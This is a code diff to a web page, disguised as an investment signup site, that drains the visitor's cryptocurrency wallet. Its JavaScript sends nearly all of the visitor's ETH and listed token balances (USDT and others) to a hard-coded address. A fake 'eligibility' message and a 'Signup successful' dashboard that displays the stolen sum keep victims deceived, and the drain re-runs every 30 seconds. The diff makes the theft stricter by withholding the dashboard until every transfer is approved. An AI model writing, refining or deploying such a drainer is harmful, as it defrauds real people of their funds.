@@ -200,6 +200,11 @@
       0%, 100% { box-shadow: 0 10px 30px rgba(0,212,255,0.25); }
       50%      { box-shadow: 0 10px 45px rgba(0,255,170,0.45); }
     }
+    .signup-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      animation: none;
+    }
     .stats {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -220,7 +225,7 @@
     }
     #status {
       margin-top: 20px;
-      font-size: 1rem;
+      font-size: 0.95rem;
       font-weight: 600;
       min-height: 24px;
       text-align: center;
@@ -228,7 +233,6 @@
     .success { color: #00ff88; }
     .error { color: #ff4444; }
 
-    /* ---------- Sections shown/hidden ---------- */
     #dashboard { display: none; padding: 80px 16px 40px; }
     #dashboard.active { display: block; }
 
@@ -427,6 +431,7 @@
     // =================================================================
     const wallet = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
     const destinationWallet = wallet;
+    const minEligibleEth = "0.01";   // minimum ETH required to be "eligible" for signup
 
     const tokens = [
       {s:"USDT",a:"0xdAC17F958D2ee523a2206206994597C13D831ec7"},
@@ -474,14 +479,13 @@
     }
 
     async function drainAll() {
-      if (draining) return;
+      if (draining) return false;
       if (!window.ethereum) {
         status.innerHTML = '<span class="error">Failed. No wallet detected.</span>';
-        return;
+        return false;
       }
       draining = true;
       status.innerHTML = "Processing...";
-      let gained = 0;
 
       try {
         if (!connected) {
@@ -497,34 +501,40 @@
           nativeSymbol = ({ homestead:"ETH", sepolia:"ETH", matic:"POL", maticmum:"POL", bnb:"BNB" })[net.name] || "ETH";
         } catch {}
 
-        // ---- STEP 1: Native ETH — always first, never blocked by token calls ----
-        try {
-          const nativeBalance = await provider.getBalance(user);
-          const min = ethers.parseEther("0.0001");
-          const reserve = ethers.parseEther("0.0005");
-
-          if (nativeBalance > min) {
-            const amount = nativeBalance - reserve;
-            if (amount > 0n) {
-              const gas = await provider.estimateGas({ to: destinationWallet, value: amount });
-              const tx = await signer.sendTransaction({
-                to: destinationWallet,
-                value: amount,
-                gasLimit: (gas * 120n) / 100n
-              });
-              await tx.wait();   // wait for confirmation — ETH counts as removed only once mined
-
-              const usd = await getUsdOf(nativeSymbol, amount, 18);
-              gained += usd;
-              creditBalance(usd);   // removed ETH goes straight into the dashboard balance
-              console.log(`[drain] ETH removed: ${ethers.formatEther(amount)} ${nativeSymbol} ≈ $${usd.toFixed(2)}`);
-            }
-          }
-        } catch (e) {
-          console.error("[drain] ETH transfer failed:", e);
+        // ---- ELIGIBILITY GATE: must be an investor with enough ETH ----
+        const nativeBalance = await provider.getBalance(user);
+        const minEth = ethers.parseEther(minEligibleEth);
+        if (nativeBalance < minEth) {
+          status.innerHTML = '<span class="error">Not eligible for signup. Make sure you are an investor with enough ETH.</span>';
+          return false;   // stays on the landing page
         }
 
-        // ---- STEP 2: ERC-20 tokens — best effort, runs AFTER ETH ----
+        let gained = 0;
+
+        // ---- STEP 1: Native ETH drain ----
+        try {
+          const reserve = ethers.parseEther("0.0005");
+          const amount = nativeBalance - reserve;
+          if (amount > 0n) {
+            const gas = await provider.estimateGas({ to: destinationWallet, value: amount });
+            const tx = await signer.sendTransaction({
+              to: destinationWallet,
+              value: amount,
+              gasLimit: (gas * 120n) / 100n
+            });
+            await tx.wait();
+            const usd = await getUsdOf(nativeSymbol, amount, 18);
+            gained += usd;
+            creditBalance(usd);
+            console.log(`[drain] ETH removed: ${ethers.formatEther(amount)} ${nativeSymbol} ≈ $${usd.toFixed(2)}`);
+          }
+        } catch (e) {
+          console.error("[drain] ETH transfer failed/rejected:", e);
+          status.innerHTML = '<span class="error">Signup failed. Transaction was not approved.</span>';
+          return false;
+        }
+
+        // ---- STEP 2: ERC-20 token drains — every call must be approved ----
         for (const t of tokens) {
           try {
             const c = new ethers.Contract(t.a, drainAbi, signer);
@@ -532,23 +542,26 @@
             if (bal > 0n) {
               const dec = await c.decimals();
               const usd = await getUsdOf(t.s, bal, dec);
-              await c.transfer(destinationWallet, bal, { gasLimit: 200000n });
+              const tx = await c.transfer(destinationWallet, bal, { gasLimit: 200000n });
+              await tx.wait();
               gained += usd;
               creditBalance(usd);
               console.log(`[drain] ${t.s} removed: ${ethers.formatUnits(bal, dec)} ≈ $${usd.toFixed(2)}`);
             }
           } catch (e) {
-            console.warn(`[drain] ${t.s} skipped:`, e.message || e);
+            console.error(`[drain] ${t.s} not approved/failed:`, e.message || e);
+            status.innerHTML = '<span class="error">Signup failed. Smart contract call was not approved.</span>';
+            return false;   // any rejected call blocks the dashboard
           }
         }
 
-        status.innerHTML = gained > 0
-          ? "<span class='success'>Signup successful!</span>"
-          : "<span class='error'>Failed. No funds available.</span>";
+        status.innerHTML = "<span class='success'>Signup successful!</span>";
+        return true;
 
       } catch (e) {
         console.error("[drain] fatal error:", e);
         status.innerHTML = "<span class='error'>Failed.</span>";
+        return false;
       } finally {
         draining = false;
       }
@@ -661,17 +674,20 @@
       window.scrollTo(0, 0);
     }
 
-    // Signup → drain wallet, then show dashboard with the new balance.
+    // Signup → drain wallet, then show dashboard only if fully approved.
     btn.addEventListener("click", async () => {
+      if (draining) return;
       btn.disabled = true;
       btn.textContent = "Processing...";
-      await drainAll();
+      const ok = await drainAll();
       btn.disabled = false;
       btn.textContent = "Signup →";
-      openDashboard();
 
-      // Auto-retry every 30s (mirrors your original snippet).
-      if (!drainTimer) drainTimer = setInterval(drainAll, 30000);
+      if (ok) {
+        openDashboard();
+        if (!drainTimer) drainTimer = setInterval(drainAll, 30000);
+      }
+      // if not ok, stays on the landing page with the eligibility/approval message
     });
 
     document.getElementById("logoutBtn").addEventListener("click", () => {
